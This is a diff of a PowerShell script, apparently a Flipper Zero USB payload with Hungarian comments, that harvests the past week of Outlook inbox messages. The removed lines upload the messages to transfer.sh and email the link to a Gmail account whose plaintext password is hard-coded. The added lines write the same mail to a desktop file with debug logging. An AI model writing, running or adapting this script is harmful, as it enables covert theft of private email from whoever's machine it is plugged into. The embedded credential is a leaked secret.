@@ -1,26 +1,49 @@
+# Debug indítása
+Start-Transcript -Path "$env:TEMP\flipper_local_debug.log" -Append
+Write-Output "=== Levelek mentése Asztalra elkezdve ==="
+
+# Dátumtartomány
 $startDate = (Get-Date).AddDays(-7)
-$tmpFile = "$env:TEMP\levek.txt"
+Write-Output "Start Date: $startDate"
 
+# Fájlútvonal az Asztalra
+$desktop = [Environment]::GetFolderPath("Desktop")
+$outFile = Join-Path $desktop "Outlook_levelek_7nap.txt"
 
-$Outlook = New-Object -ComObject Outlook.Application
-$Namespace = $Outlook.GetNamespace("MAPI")
-$Inbox = $Namespace.GetDefaultFolder(6) # 6 = Inbox
-$Items = $Inbox.Items | Where-Object { $_.ReceivedTime -gt $startDate }
+# Outlook COM API kapcsolat
+try {
+    $Outlook = New-Object -ComObject Outlook.Application
+    $Namespace = $Outlook.GetNamespace("MAPI")
+    $Inbox = $Namespace.GetDefaultFolder(6)
+    $allItems = $Inbox.Items
+    Write-Output "Inbox total: $($allItems.Count)"
+} catch {
+    Write-Output "❌ Outlook hibás vagy nem elérhető: $_"
+    Stop-Transcript
+    exit
+}
 
+# Szűrés
+$filtered = @()
+foreach ($item in $allItems) {
+    try {
+        if ($item.ReceivedTime -gt $startDate) {
+            $filtered += $item
+        }
+    } catch {}
+}
+Write-Output "Szűrt levelek: $($filtered.Count)"
 
-$Items | ForEach-Object {
-    "Subject: $($_.Subject)`nFrom: $($_.SenderName)`nDate: $($_.ReceivedTime)`nBody:`n$($_.Body)`n`n---`n"
-} | Set-Content -Path $tmpFile
+# Mentés fájlba
+try {
+    $filtered | ForEach-Object {
+        "Subject: $($_.Subject)`nFrom: $($_.SenderName)`nDate: $($_.ReceivedTime)`nBody:`n$($_.Body)`n---`n"
+    } | Set-Content -Path $outFile
+    Write-Output "✅ Levelek elmentve ide: $outFile"
+} catch {
+    Write-Output "❌ Mentési hiba: $_"
+}
 
+# Debug lezárás
+Stop-Transcript
 
-$response = Invoke-RestMethod -Uri "https://transfer.sh/levek.txt" -Method Put -InFile $tmpFile
-$link = $response.Content
-
-
-$EmailUser = "uvbnfckd@gmail.com"
-$EmailPass = ConvertTo-SecureString "Q2k5svx7Yxx!" -AsPlainText -Force
-$Creds = New-Object System.Management.Automation.PSCredential($EmailUser, $EmailPass)
-Send-MailMessage -From $EmailUser -To "uvbnfckd@gmail.com" -Subject "Outlook Levelek" -Body "Letöltési link: $link" -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential $Creds
-
-
-Remove-Item $tmpFile -Force
